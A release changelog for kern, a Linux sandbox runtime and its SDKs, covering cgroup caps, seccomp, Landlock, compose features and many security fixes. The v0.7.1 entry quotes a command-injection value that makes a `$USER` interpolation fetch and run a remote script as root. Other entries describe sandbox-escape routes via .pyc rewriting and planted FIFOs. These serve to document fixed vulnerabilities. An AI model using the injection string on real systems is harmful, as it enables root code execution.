# Changelog

**CLI stability.** As of v0.7.0 the command surface is stable: the verbs, their flags, and the
`--json` output shapes change incompatibly only on a **minor bump** (`0.8.0`+, since kern is `0.x`),
never on a patch, and only after a deprecation entry here at least one release earlier. `--json`
output is additive: new fields may appear, so consumers must **ignore unknown fields**; removing or
renaming one is the breaking change the minor-bump rule covers. A `cli_surface_is_frozen` test
snapshots the surface and fails the build on any undocumented change. Internal config-file keys may still evolve, but
scripts and SDKs written against the CLI can rely on it. Install the release binary with
`curl -fsSL https://raw.githubusercontent.com/getkern/kern/main/install.sh | sh`, or build from source
with `cargo install --git https://github.com/getkern/kern getkern --locked`. Full detail for any entry
is in the git history.

## Unreleased

**`kern-sandbox` 0.1.39** is on PyPI and npm, with the `integrations/pi` extension that requires it.
The **runtime** changed too, so this one needs a tag: mount-posture fixes in `kern-isolation`, the OOM
message on hosts where it never printed, and one new `kern box` flag. The CLI change is additive
(`--shm-size`), which the stability policy above allows on a patch.

### Changed

- **`deps_readonly` now defaults to TRUE** in both bindings, so `run_code` mounts what `setup=`
  installed read-only and a cell cannot change what the next cell in the same session imports. The
  route it closes is bytecode: a `.pyc` is validated on the source's timestamp and size, so a cell
  could rewrite `.deps/.../mylib.pyc`, re-paste the legitimate 16-byte header, leave the `.py` alone,
  and the next `import` ran it. Invisible to `result.files` and to `list_files()`.

  **What breaks:** a workload that writes into `.deps` at RUN time now gets `EROFS`. `deps_readonly=False`
  restores the old behaviour. A run-time `pip install` fails first for the network, which is off
  outside `setup=`, not for the mount.

  It costs nothing at run time: the setup box compiles the bytecode before the mount closes. Without
  that step a session whose setup skipped compilation paid +40 ms on every call, for its whole life
  (250 ms/call against 290, measured on `requests`).

- **A timeout now reports `exit_code = 137` in Python, not `-9`.** Node already did; a shell, kern's
  own CLI and docker all do. A caller branching on `137` saw the timeout in one binding and missed it
  in the other. Ordinary exit codes are untouched.

- **`integrations/pi` declares `engines: node >= 22`.** `pi`'s package manager imports `globSync` from
  `node:fs`, which landed in 22, so on Node 20 the extension died at import with a `SyntaxError`
  naming a file inside `pi-coding-agent`. Measured: 20.18.1 fails, 22.11.0 runs all 165 assertions.

### Added

- **`kern box --shm-size SIZE`**, for a workload that needs `/dev/shm` sized differently from
  `--memory`.

- **`kern-sandbox` (Python and Node): `prewarm=N`** keeps N boxes started in advance, so `run_code`
  costs ~1 ms instead of ~39 without giving up the fresh-box guarantee: a prewarmed box serves exactly
  one cell and is then destroyed. Measured over ssh: 37.8 ms per call before, 1.6 ms after.

  A slot refills in ~70 ms, so N is a burst budget rather than a throughput setting: N back-to-back
  calls run at ~1 ms and the rest fall back until the pool catches up. A call whose posture differs
  from the pooled box's (network, mounts, env, profiles, or a deadline longer than the box's remaining
  backstop) is never served from the pool, and a streaming call falls back to the cold path so it can
  stream for real. One observable does differ: the interpreter is older than the call, so a cell
  reading its own start time sees ~0 s cold and up to five minutes warm.

  Default `0` in the SDK, because holding a booted interpreter per slot is the caller's resource
  decision. Default `1` in `kern-mcp` (`KERN_MCP_PREWARM`), where the session already holds a box for
  its whole life.

- **Every box gets a writable `/tmp`**, 64 MiB of tmpfs, charged to the box's own memory cap.
  `security_profile="untrusted"` gets none, deliberately. Nothing in `/tmp` survives a call or a
  `snapshot`.

### Fixed (runtime)

- **The OOM message never printed when kern runs as root, or on a host with no systemd** - which is
  where the cap is most likely to be the only thing between a workload and the machine. A box killed
  by its cap exited 137 with an empty screen.

  Two causes. The counter was read by walking KERN's cgroup ancestors, which answers for the box only
  when the two share one: on a root VPS kern sits under `user.slice` and the box under `system.slice`,
  whose only common ancestor never exposes `memory.events`. And on the direct-cap path the supervisor
  sat INSIDE the box's cgroup, so `memory.oom.group` killed the process that had to report the kill.
  The counter is now read from where the box is, and the supervisor sits in a sibling leaf while the
  workload joins the capped cgroup itself.

  Verified on four hosts: WSL2 with no systemd, a root VPS, a non-root Jetson and one desktop. On all
  four a clean exit still says nothing, a SIGKILL that is not the cap is not blamed on it, and
  `--memory` still binds on `box` and on `run`.

- **`--egress-allow` could leave a box with NO outbound access and say nothing.** The in-box proxy port
  is opened by a helper that joins the box netns; when that bind failed, the box started anyway with
  `http_proxy` pointing at a dead port, so every request - including to the allowed domains - failed
  with `Connection refused` naming neither the cause nor the flag. The helper now confirms it is
  listening before the workload runs, and the box is refused with a message naming the flag if it
  cannot.

- **The registry recorded the supervisor's cgroup for every box**, and `kern stop` writes
  `cgroup.kill` into the path it records, so a stop would have killed the reporter and left the box
  running. It now records the directory kern created rather than one derived from the child's `/proc`
  entry mid-fork.

- **A `-v` volume is now mounted `nosuid`, `/workspace` included.** Defence in depth: `PR_SET_NO_NEW_PRIVS`
  is armed before the workload runs, which already makes the setuid bit inert process-wide, so a failed
  `nosuid` remount is never fatal. A `:ro` volume still fails hard, because read-only is a contract the
  caller asked for and nothing else provides it.

- **`/dev/shm` now reports the size the box actually has.** It was mounted with no `size=`, so
  `statvfs` reported half the HOST's RAM: a box held at 512 MiB was telling every workload it had
  15.6 GB, which is the number Postgres, Chromium and a PyTorch DataLoader size buffers from. It now
  carries the cap already enforced. A box with no cap enforced anywhere keeps the unsized mount,
  because there is no honest number to put there.

### Fixed (kern-sandbox)

- **A warm interpreter could not import anything the IMAGE ships**, and the shipped `kernel()` had
  that defect since it landed. The driver started as `python3 -S`, which skips `site` and therefore
  `site-packages`, so `import numpy` worked on a cold `run_code` and raised `ModuleNotFoundError` in a
  kernel cell. What hid it: `setup=` installs into `.deps`, which is on `PYTHONPATH` either way, so
  only cells relying on the image could not import. `-S` is dropped in both paths and both bindings.

  A custom image that ships `.pth` files will now run their `import` lines at interpreter start, and
  for a prewarmed box that happens at pool-fill time. The default image ships none.

- **`kern-sandbox` 0.1.36 on npm could not be installed at all.** Its `package.json` declared a
  dependency on itself via a local tarball path, so `npm install` failed with `ENOENT`. Fixed in
  0.1.37; 0.1.36 is deprecated on npm with a message naming it. The PyPI package of that version is
  unaffected.

- **`memory_mb` bounds the cgroup, not the workload's usable memory**, and the docs now say so: a
  tmpfs, `/dev/shm` and the page cache are charged to the same cap.

## v0.9.0 - 2026-09-04

A minor bump because one exit code changes: see the first entry. Everything else is a defect fix.

### Changed

- **`kern box --plan` now exits non-zero when a profile it named cannot attach.** It printed
  `cannot attach: no [[vcpu]] profile named 'nope'` and exited **0**, while the same command without
  `--plan` exited 1, so `kern box ... --plan && kern box ...` walked on to a launch the preview had
  already established could not happen. A script that gated on the preview and ignored its exit code
  is unaffected; a script that gated on `&&` now stops where it should have stopped before. The whole
  plan still prints and every broken profile is counted, so a configuration with three typos is fixed
  in one pass rather than three.

### Fixed

- **A `kern run` that nobody capped said nothing, and one killed by the cap said nothing either.**
  A plain `kern run` is not uncapped: the scope it re-execs into carries `MemoryMax=512M`.
  `KERN_NO_SCOPE=1` skips that scope and the default goes with it, and both existing warnings were
  gated on the caller having ASKED for a cap, so the case where nothing was typed ran in whatever
  cgroup the caller sat in and printed nothing. Measured, allocating 800 MiB against the default:
  `kern run` was killed at rc 137, `KERN_NO_SCOPE=1 kern run` completed at rc 0 with an EMPTY stderr.
  Separately, a workload the OOM killer took exited 137 with no output at all; 137 is `128 + SIGKILL`
  and SIGKILL has many senders, so on its own it told an operator nothing. Both now say what happened,
  and the OOM message is kept to what is actually measured: the killer fired in kern's cgroup subtree
  while the box ran, not which process it took.
- **An error that lists things reached the user as one run-on line.** `kern volume rm a b` printed
  `error: 2 volume(s) not removed:  no volume named 'a'  no volume named 'b'`, because the scrub that
  strips control characters stripped the newlines that made it a list. Newlines survive now and every
  continuation line is indented, so a hostile value still cannot forge a line at column 0 where kern's
  own `error:` and `hint:` prefixes live.
- **The seccomp allow-list generator promised to run `cargo fmt` and never ran it,** so `--write` left
  623 changed lines on a file whose own header says DO NOT EDIT BY HAND and turned the format check
  red. Three places also pointed at the bare command, which only CHECKS, including the failure message
  the check itself prints: following it re-ran the check and changed nothing.
- **`kern-sandbox` (Python and Node): a FIFO the box planted could stall the host's read, or fake it.**
  `read_file`/`readFile` opened `O_NOFOLLOW`, which stops a symlink, and a symlink is not the only
  thing a box can leave at a name. A box that runs `mkfifo out.png` made the host's read wait for a
  writer that never comes, with no timeout: the box decided how long the caller's call took. Adding
  `O_NONBLOCK` alone would have been worse, because a non-blocking read of a writer-less FIFO returns
  zero bytes and the call would have reported an EMPTY FILE. Both halves ship: the open is
  non-blocking AND a descriptor that is not a regular file is refused. Published as **0.1.35** on PyPI
  and npm, which also rewrites both package pages: the PyPI one went from 37,371 characters to 15,320
  and now opens on running AI-generated code rather than on what kern is, with the LangChain
  shell-middleware section moved whole to `bindings/python/LANGCHAIN-SHELL.md`.
- **The MCP server's memory default shadowed a profile's own.** `KERN_MCP_MEMORY_MB` defaulted to 1024
  and was sent on every call, and an explicit flag beats a profile, so a `vcpu:` profile carrying its
  own `memory=` could never apply it. Unsetting the variable did not help: it fell back to the same
  default. `0` now means "send no `--memory` at all".

## v0.8.9 - 2026-09-03

### Fixed

- **`compose start` returned while a restarted service was still unreachable, and said the opposite.**
  A live holder serving the same plan is left alone on purpose, so after `stop b; start` its relays
  are still the ones built against the box that has just been replaced. Measured: the relay halves
  keep the old pids for about 290 ms while the line above them reads `2 peer relay(s) up`. A stale
  relay ACCEPTS the connection and cannot forward it, so a bare connect sees a healthy stack and only
  a payload sees the truth: `compose start && curl peer` failed intermittently in a script while kern
  reported success.

  The holder now publishes the edges it is serving and the pids each was built against, and `start`
  waits for those to be the current ones. It also asks for the registry scan rather than waiting out
  the periodic one, which brings `start` to about 336 ms: faster than the 700 ms it took while it was
  wrong.

  Reported as a timing miss in a tight stop/start loop, read at the time as an application race. It
  was not: both the relay and the service were bound and the payload still failed.

  The test that should have caught this slept for six seconds first, so a defect lasting 1.65 s could
  never fail it. It now fetches a payload with no settling time, immediately after `start` returns.

## v0.8.7 - 2026-09-03

### Fixed

- **`compose stop` named a pod that a `--no-pod` stack never had.** The message had two states where
  there are three: on a `--no-pod` stack no pod is ever created, and "no pod holder" was read as "the
  pod collapsed", so stopping one service answered `pod '<name>' gone with its last member` while the
  other services were still running. False twice over. The behaviour was correct throughout; only the
  sentence was wrong. Reported against the released 0.8.6 binary.

### Documentation

- **`compose watch` and `compose port` reached the README.** Both shipped in 0.8.6 and neither
  appeared on the front page: `watch` was documented nowhere outside `kern --help`, and `port` only
  under `docs/`. Found by auditing the README against the released binary rather than by reading it:
  every verb and flag it uses exists, every command in it runs, and both TOML blocks pass `validate`
  and `compose config`.

## v0.8.6 - 2026-09-03

### Added

- **Peer reachability under `--no-pod`.** Services in a stack started with `--no-pod` resolve and reach
  each other by service name, through per-service loopback aliases, without sharing a network
  namespace. A pair that shares an internal port keeps whichever direction it can: a service binding
  `0.0.0.0:PORT` owns every address on that port and cannot host a peer's alias there, while one
  binding `127.0.0.1:PORT` can. kern measures which it is once the services are running and names any
  direction it cannot serve, with the edits that clear it.

- **`kern compose <file> watch [service...]`**: rebuild and restart one service when its `build:`
  context changes, and nothing else.

- **`kern compose <file> port <service> <container-port>`**, the twin of `docker compose port`: prints
  the host address serving that container port, read from the running box rather than from the file.

- **`kern --help` describes `compose watch` and `compose port`.** Both shipped listed in the reference
  and absent from the help output.

### Changed

- **`compose stop`, `start` and `restart` act on the services you name.** `[service...]` was accepted
  and ignored, so `compose stop web` stopped the whole stack.

### Fixed

- **`kern stop` could report a foreground box as unconfirmed while it kept running.** `signal_box`
  ignored the result of `pidfd_send_signal` and never fell back, so on a host where that syscall is
  filtered the signal was never delivered and the box survived a stop that reported success.

- **Concurrent `kern box -d` children garbled their confirmation lines**, because `stderr` is
  unbuffered and each wrote in several calls.

- **A compose error listed scoped box names to a reader who typed service names**: `no service 'x' in
  the stack` now lists what the file declares.

- **Three tests failed as root, or with `/tmp` on overlayfs**, for reasons in the fixtures rather than
  in the code they pinned.

- **The relay mesh behind `--no-pod` was hardened through the cycle that introduced it.** Twenty-one
  defects, all in code first shipping in this release, so the feature arrives with them closed rather
  than shipped and then repaired: a holder that outlived its teardown, one that burned 2.75% of a core
  on an idle stack, a stack that lost every peer when one service restarted, `compose ps` reporting a
  running stack as down, `compose up --no-pod` never returning under a pipe, a UDP-only service
  silently unreachable, a plan parser that accepted names a box cannot have, and a listener that kept
  `CAP_NET_BIND_SERVICE` after claiming every set was empty. The git history carries them one by one.

### Documentation

- **README and BENCHMARKS.md gave different numbers for the same measurement.** Both now carry the
  same figures, and BENCHMARKS states the method that produced them.

- **kern against bubblewrap on aarch64**, which had never been measured. On a Jetson Orin Nano and an
  Arduino UNO Q, at equal work, kern is 21% faster; the default is slower, because it spends a
  `systemd-run --user --scope` per box to get a cgroup cap bubblewrap never applies.

## v0.8.5 - 2026-09-01

### Added

- **A `docker-compose.yml` can name a `kern.toml` resource profile**, through the Compose extension
  namespace (`x-kern-vcpu`, `x-kern-vdisk`, `x-kern-vgpio`), so the same file still runs unchanged
  under Docker, which ignores `x-` fields by spec.

- **`x-kern-security-profile: untrusted` in a compose file**: the hardening bundle (seccomp allowlist,
  `--cap-drop ALL`, read-only root) per service.

- **An unrecognised key in the `x-kern-` namespace is named rather than ignored.** A key of ours that
  does nothing and says nothing is the defect the namespace exists to avoid.

### Changed

- **The block-scalar chomping indicator now decides something, and that changes existing files.**
  `|`, `|-` and `|+` differ in the trailing newlines they keep, and all three were read the same way.

- **A compose file that names a `vgpio` profile is refused unless the person running it says so
  explicitly.** A device grant arriving through a file someone else wrote is the one profile kind that
  hands real hardware to a box.

### Fixed

- **A one-shot service that succeeded failed the stack.** `compose up` is fail-closed on bring-up, and
  a service that exits 0 within the settle window was read as a service that died.

- **A recycled PID could put `exec`, `cp`, `commit`, `stop` and the health probe in a stranger's
  process.** Liveness is now pinned by `(pid, starttime)` rather than by pid alone.

- **Three helpers could hand `-1` to `kill`, which signals every process the user owns**, and
  `signal_box` could send a stop signal and then `SIGKILL` to the caller's own process group. Both are
  refused now, and a pid that cannot be a process no longer reads as a live one.

- **Health checking had four ways to go wrong**: a foreground box took `--health-cmd` and never
  evaluated it, a SIGKILL'd launcher left its checker probing forever, a checker that gave up said
  nothing in the record, and one held its launcher's pid across time without pinning it.

- **Seven parser defects let a malformed value through as a well-formed one**, in YAML and in TOML: a
  NUL byte travelling into a value, a key written twice resolved instead of refused, a folded scalar
  folding breaks it may not fold, a tab after a colon read as indentation, a TOML multi-line string
  dropping a character nobody wrote, an unterminated `${` kept as a literal, and three that shared one
  mistake. `kern compose <file> config` also accepted profile and security-profile values that `up`
  would then refuse.

- **`kern top`'s output muting stole the stdout of the whole process**, not of its own work.

- **The pid1 fallback could pick a nested init instead of the box's own.**

- **A `nice` value the kernel refuses was accepted, echoed back, and silently dropped.**

### Documentation

- **`kern compose <file> config` reports what each profile name resolved to on THIS host**, and a
  `kern.toml` key this build does not read is now named rather than skipped.

- **The port-collision refusal now names what `--no-pod` costs**, instead of pointing at it as a free
  way out, and every example script prints which `kern` it resolved before running anything.

## v0.8.0 - 2026-08-31

### Changed

- **`kern compose <file> up -d` is accepted.** It used to be a usage error, and it is the most common
  way anyone starts a stack.

- **A numeric `USER` takes its group from the image's `/etc/passwd`, not from its own number**, and an
  image `USER` the image cannot resolve refuses to start the box, as Docker does. It used to run the
  workload as a uid nothing in the image maps.

- **An image reference the OCI grammar cannot hold is refused where you type it**, not where it
  eventually fails.

### Added

- **`kern box --entrypoint`**, repeatable, one argv element per flag: an override that overrides.

### Security

- **Five resource caps on untrusted registry data had no boundary test**, and two security predicates
  had none either. All seven now have one, and the tests fail against the unbounded version.

### Fixed

- **`kern <typo> --help` printed the whole reference and exited 0.** A wrong verb now says so.

- **A `kern config add` that failed had already changed your config file.** The write is atomic now.

- **`kern doctor` reported a missing `/etc/subuid` allocation that was there.**

- **`kern builds --status interrupted` listed builds the same command printed as `running`.**

- **The container-only port warning quoted port 8000 whatever the file said**, and a refused port
  collision named the box rather than the service the reader typed.

- **The macOS CI job tested one of the installer's two branches and could not tell them apart.** Both
  are driven from a controlled PATH now, and the assertion that separates them is the absence of
  `brew install` on a Mac that already runs a Linux VM.

### Documentation

- **`kern --help` names the values `--status` takes and the compose `-d` it now accepts.**

- **The README's compatibility promise carries the constraint that qualifies it**, and the flat
  build's base copy names what it costs and why.

## v0.7.1 - 2026-08-28

### Added

- **`kern doctor` reports what a VRAM cap on each GPU would be worth.** One line per DRM card.
  `TIER-HW` where the device enforces a partition (SR-IOV virtual function, or MIG instances
  configured). `TIER-SOFT` everywhere else, which on consumer hardware means a cooperative quota:
  worth density, fairness and overcommit accounting, **not a boundary against malicious code**. kern
  still slices no GPU; this publishes the judgement before the capability. There is no middle tier
  because `dmem` does not enforce the compute path ML tenants use: with `dmem.max` at 2 GB an 8 GB
  `hipMalloc` succeeded while `dmem.current` stayed at 0. Detection is read-only, opens no device,
  and costs 36 us per scan.

- **`--landlock-rw <path>` works on `kern run`**, not only on `kern box`. Landlock restricts the
  calling process, so no namespace is needed: `kern run --landlock-rw ~/project -- ./agent` confines
  the binary's writes to that directory. Three differences from `box`, all because there is no
  namespace: it grants only what you name plus the usual character devices, so `/tmp` and `/run` are
  not automatic; it refuses to run where the kernel has no Landlock; and it implies `no_new_privs`,
  so `sudo` inside the confined command stops working. A path that does not exist, or whose last
  component is a symlink, is refused rather than skipped. Additive: no existing invocation changes.

- **A fifth adversarial suite, `pentest/pentest-gpu-claims.sh`**, attacking a claim rather than a
  mechanism: whether `kern doctor`'s verdict about each card survives contact with the driver. T5 is
  the decisive case and it fails the way the tier model says it must, on three machines: a process
  with no vendor library in its address space reaches the driver with a raw ioctl. It starts no box,
  so it runs **in CI on every push**, unlike the other four.

### Fixed

- ⚠️ **A box that used to run uncapped on some hosts is now capped, and can be OOM-killed where it
  previously survived.** `--memory` and the pid cap now bind when kern runs **as root** on a host
  with no `systemd --user` manager: a container, or WSL2, where kern is uid 0. Boxes there had no
  ceiling at all, including the defaults that apply with no flags. `kern doctor` shows which kind of
  host you are on; `--allow-uncapped` keeps the old behaviour. Hosts that were already capping are
  unaffected, and so is a ROOTLESS session with no user manager: there kern still has no cgroup it
  may write to, and still says so at every start. A colima guest reached over `colima ssh` is that
  second case, measured on Apple Silicon: the session lands in `/system.slice/ssh.service`, owned by
  root and not writable by the user, and no `user@<uid>.service` is ever created.

- **`kern doctor` interpolated `$USER` into a `sudo` command it invites you to paste.** With
  `USER='x; curl http://host/p | sh #'` it printed a line that runs an attacker's script as root. It
  is now an allowlist of the portable name set, falling back to the numeric uid.

- **macOS is answered where a Mac user looks.** The installer refused Darwin and stopped; the README,
  the platform table and both SDK pages did not mention macOS at all. All of them now say the same
  thing: no native port, kern runs inside a Linux VM on a Mac, verified on Apple Silicon with an
  Ubuntu 24.04 guest, with the two obstacles that guest produces and their fixes. The installer looks
  for a VM you already have before suggesting one. CI runs those messages on a real Mac every push.

- **`kern examples` promised a per-line GPIO grant kern does not make.** It said `pins` exposes only
  those lines; the grant is chip-granular, and requesting any pin binds every `/dev/gpiochipN` on the
  host. Corrected where the field is declared, with a test that fails on the old wording.

- **A Landlock grant on a file rather than a directory no longer loses the whole ruleset.** The rule
  carried directory-only rights, the kernel answered `EINVAL` on a file, and the failure discarded
  every rule. `kern box --landlock-rw /etc/hosts` failed that way on both verbs.

- **`TIER-HW` claimed an enforcement it had not measured.** It read "per-tenant VRAM enforced by the
  device"; what the detector establishes is a topology, not a memory split. The string now names both
  gaps, including that the verdict is per card while MIG partitions per instance.

## v0.7.0 - 2026-08-24

### Security

- **`--landlock-rw` is now fail-closed**, the only change to a flag's meaning in this release. A
  kernel without Landlock used to run the workload unconfined; it now refuses.

### Fixed

- **A box's exit code no longer depends on the init system's version.** The same binary and the same
  workload reported different codes on different hosts.

- **`kern stop` records the workload's own exit code, not a blanket 137**, so a service that traps the
  signal and exits 7 is recorded as 7.

- **A signal aimed at a foreground `kern box` is aimed at the box.** kern used to die on a SIGTERM and
  leave the workload running.

- **`--stop-timeout` is honoured in full, not rounded down to whole seconds**, and its help says when
  the grace period is skipped. A service's `stop_grace_period` is its own upper bound again, rather
  than the longest one in the file.

- **An orphaned box is recoverable on the systemd-scope path too**, not only on the direct one.

- **`kern wait` answers for a box that has already exited**, from the same exit record `kern ps -a`
  reads.

- **Four lines of help and documentation that no longer matched the code.**

### Added

- **`--security-profile untrusted`**: an opt-in bundle of the seccomp allowlist, `--cap-drop ALL` and
  `--read-only`, applied as a base that explicit flags override. `--cap-add ALL` and `--privileged`
  are refused under it, because either would leave a box labelled untrusted that is not, and a
  SET-but-unrecognised `KERN_SECCOMP` is a usage error rather than a silent downgrade. It does not
  touch Landlock and does not set `--require-limits`.

- **`--require-limits`** (or `KERN_REQUIRE_LIMITS`): refuse to start unless the memory and pids caps
  are actually enforced, read back from the cgroup, instead of running best-effort uncapped.
  `--allow-uncapped` is the explicit inverse for a host with no cgroup delegation. Mutually exclusive;
  the default is unchanged.

- **The SDKs reach CLI parity for both**: `security_profile`/`securityProfile` and
  `require_limits`/`requireLimits`. Note that `require_limits` is the fail-closed gate, distinct from
  `enforce_limits`, which only picks the cap path.

- **`--user` (and compose `user:`) accepts a NAME**, resolved against the image's own `/etc/passwd`,
  and the image's declared `USER` is honoured the same way. It fails closed on a host without
  `newuidmap` rather than silently running as in-box root.

- **`kern ps -a` lists recently-exited boxes**, and `kern wait` resolves one that has already exited.

- **A CI gate fails, naming the syscall, when a new kernel `__NR_*` is neither allowed, denied, nor on
  the reviewed list** (x86_64 and aarch64).

- **`kern doctor` names the commands to run** for the multi-uid check rather than hardcoding `apt`,
  and reports whether `pasta` is present for outbound networking.

- **A compose `shm_size:` is recognised and left cgroup-bounded**: `/dev/shm` is charged to the box's
  memory cgroup rather than pinned to a fixed size, so there is no 64 MB footgun to size around.
